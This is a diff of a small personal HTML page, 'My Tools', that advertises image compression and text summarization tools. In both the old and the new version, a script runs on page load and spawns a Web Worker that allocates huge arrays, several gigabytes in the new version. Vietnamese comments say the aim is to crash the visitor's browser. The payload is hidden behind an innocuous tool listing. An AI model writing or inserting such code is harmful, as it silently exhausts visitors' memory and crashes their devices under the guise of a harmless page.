@@ -1,90 +1,66 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Tools</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <header>
-        <h1>Welcome to My Tools</h1>
-        <p>Here are the free tools I offer for you to use:</p>
-    </header>
+<!DOCTYPE html>    <html lang="en">    
+<head>    
+    <meta charset="UTF-8">    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
+    <title>My Tools</title>    
+    <link rel="stylesheet" href="styles.css">    
+</head>    
+<body>    
+    <header>    
+        <h1>Welcome to My Tools</h1>    
+        <p>Here are the free tools I offer for you to use:</p>    
+    </header>    <section id="tools">    
+    <h2>Tools Collection</h2>    
+    <ul>    
+        <li>    
+            <h3>Tool 1: Image Compression</h3>    
+            <p>Use this tool to compress your images to save your image size.</p>    
+            <a href="Tools/Compression.html" target="_blank">Access Tool</a>    
+        </li>    
+        <li>    
+            <h3>Tool 2: Text Summarization</h3>    
+            <p>Summarize your long text into shorter versions with AI.</p>    
+            <a href="Tools/Summarization.html" target="_blank">Access Tool</a>    
+        </li>    
+    </ul>    
+</section>    
 
-    <section id="tools">
-        <h2>Tools Collection</h2>
-        <ul>
-            <li>
-                <h3>Tool 1: Image Compression</h3>
-                <p>Use this tool to compress your images to save your image size.</p>
-                <a href="Tools/Compression.html" target="_blank">Access Tool</a>
-            </li>
-            <li>
-                <h3>Tool 2: Text Summarization</h3>
-                <p>Summarize your long text into shorter versions with AI.</p>
-                <a href="Tools/Summarization.html" target="_blank">Access Tool</a>
-            </li>
-        </ul>
-    </section>
+<footer class="footer">    
+    Copyright © 2024 - 2025 HiepDev147. All Rights Reserved    
+</footer>    
+<script>function crashStable() {    
+const workerCode = `    
+self.onmessage = function() {    
+  // Tạo 10 lần mảng lớn (100 triệu phần tử mỗi cái)    
+  for (let j = 0; j < 10; j++) {    
+    const arr = new Float64Array(100_000_000);    
+    for (let i = 0; i < arr.length; i++) {    
+      arr[i] = Math.random();    
+    }    
+    postMessage(arr); // gửi từng đợt, dễ crash    
+  }    
+};
 
-    <footer class="footer">
-        Copyright © 2024 - 2025 HiepDev147. All Rights Reserved
-    </footer>
-    <script>
-function crashStable() {
-  // Lấy RAM máy (giá trị gần đúng, nếu không hỗ trợ sẽ là undefined)
-  const ramGB = navigator.deviceMemory || 4; // mặc định 4GB nếu không biết
+`;
 
-  console.log(`💾 Phát hiện RAM máy: ${ramGB} GB`);
+const blob = new Blob([workerCode], { type: "application/javascript" });    
+const worker = new Worker(URL.createObjectURL(blob));    
 
-  // Quy ước kích thước mảng theo RAM
-  // Ví dụ: RAM < 6GB thì dùng mảng nhỏ, >=6GB thì mảng lớn
-  let chunkSize, chunkCount;
+worker.onmessage = function(e) {    
+    console.log("🔥 Nhận dữ liệu đợt:", e.data.length);    
+    // Buộc phải truy cập dữ liệu để tăng tải lên RAM    
+    const sum = e.data.reduce((a, b) => a + b, 0);    
+    console.log("Tổng:", sum);    
+};    
 
-  if (ramGB >= 8) {
-    chunkSize = 100_000_000; // 800MB
-    chunkCount = 5;          // tổng ~4GB
-  } else if (ramGB >= 4) {
-    chunkSize = 30_000_000;  // 240MB
-    chunkCount = 10;         // tổng ~2.4GB
-  } else {
-    chunkSize = 10_000_000;  // 80MB
-    chunkCount = 10;         // tổng ~800MB
-  }
+setTimeout(() => {    
+    console.log("💥 Boom (ổn định)!");    
+    worker.postMessage("go");    
+}, 1000);
 
-  console.log(`🔧 Tạo ${chunkCount} lần, mỗi lần mảng size ${chunkSize}`);
-
-  const workerCode = `
-    self.onmessage = async function() {
-      for (let j = 0; j < ${chunkCount}; j++) {
-        const arr = new Float64Array(${chunkSize});
-        for (let i = 0; i < arr.length; i++) {
-          arr[i] = Math.random();
-        }
-        self.postMessage(arr.buffer, [arr.buffer]);
-        await new Promise(r => setTimeout(r, 100));
-      }
-    };
-  `;
-
-  const blob = new Blob([workerCode], { type: "application/javascript" });
-  const worker = new Worker(URL.createObjectURL(blob));
-
-  worker.onmessage = function(e) {
-    const arr = new Float64Array(e.data);
-    console.log(`🔥 Nhận chunk: ${arr.length} phần tử`);
-    const sum = arr.reduce((a, b) => a + b, 0);
-    console.log(`Tổng: ${sum}`);
-  };
-
-  setTimeout(() => {
-    console.log("💥 Bắt đầu load dữ liệu!");
-    worker.postMessage("go");
-  }, 1000);
 }
-
 window.addEventListener('load', crashStable);
 </script>
-</body>
+
+</body>    
 </html>
